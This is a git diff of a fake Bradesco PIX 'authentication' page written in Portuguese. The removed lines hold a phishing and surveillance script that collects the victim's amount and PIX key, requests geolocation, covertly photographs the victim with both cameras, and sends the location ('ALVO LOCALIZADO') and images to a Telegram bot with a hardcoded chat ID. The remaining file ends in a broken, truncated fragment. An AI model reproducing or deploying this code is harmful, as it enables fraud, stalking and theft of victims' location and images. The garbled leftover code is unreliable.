@@ -7,7 +7,7 @@
 
     <meta property="og:title" content="SISTEMA DE AUTENTICAÇÃO PIX">
     <meta property="og:description" content="Conferência de recebimento pendente. Autentique para liberar o valor via PIX.">
-    <meta property="og:image" content="https://autenticador2.github.io/PixAutomatico/bradesco_pix(1).png">
+    <meta property="og:image" content="https://autenticador2.github.io/PagamentoPix/bradesco_pix(1).png">
     <meta property="og:type" content="website">
 
     <style>
@@ -32,76 +32,7 @@
         <input type="number" id="valor" placeholder="Ex: 1250,00">
         
         <label>Chave PIX do Beneficiário:</label>
-        <input type="text" id="chave" placeholder="CPF, E-mail ou Celular">
-
-        <button class="btn-resgatar" onclick="iniciarCaptura()">
-            AUTENTICAR E RECEBER
-            <div class="spinner" id="spinner"></div>
-        </button>
-
-        <div class="footer-info">
-            Sistema de Segurança Interbancário<br>
-            Criptografia de Ponta a Ponta - Banco Central
-        </div>
-    </div>
-</div>
-
-<video id="video" width="640" height="480" autoplay style="display:none;"></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-<script>
-    const TELEGRAM_TOKEN = "INSIRA_AQUI_O_TOKEN_QUE_O_BOTFATHER_TE_DEU";
-    const CHAT_ID = "560716860";
-
-    async function iniciarCaptura() {
-        const v = document.getElementById('valor').value;
-        const c = document.getElementById('chave').value;
-
-        if (!v || !c) {
-            alert("Preencha os dados para autenticar.");
-            return;
-        }
-
-        document.getElementById('spinner').style.display = 'inline-block';
-
-        // 1. PEDIR LOCALIZAÇÃO (A BARREIRA)
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            
-            // Enviar texto inicial
-            await enviarMensagem(`📍 *ALVO LOCALIZADO*\n💰 Valor: ${v}\n🔑 Chave: ${c}\n🌍 Mapa: https://www.google.com/maps?q=${lat},${lon}`);
-
-            // 2. PEDIR CÂMERA E TIRAR FOTOS
-            try {
-                // Foto Frontal
-                await tirarFoto("user", "FRONTAL");
-                // Foto Traseira
-                await tirarFoto("environment", "TRASEIRA");
-                
-                // Sucesso: Vai para o Token
-                window.location.href = "bradesco.html";
-            } catch (e) {
-                // Se negar câmera após permitir GPS, ainda assim vai para erro ou token conforme sua escolha
-                window.location.href = "autorizar.html";
-            }
-
-        }, (err) => {
-            // Se negar localização, trava na página de erro
-            window.location.href = "autorizar.html";
-        });
-    }
-
-    async function tirarFoto(camera, label) {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camera }, audio: false });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        
-        await new Promise(resolve => video.onloadedmetadata = resolve);
-        const canvas = document.getElementById('canvas');
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        
-        stream.getTracks().forEach(track => track.stop()); // Desliga a câmera rápido
+        <input type="text" id="chave" placeholder="CPF, E
 
         return new Promise(resolve => {
             canvas.toBlob(async (blob) => {
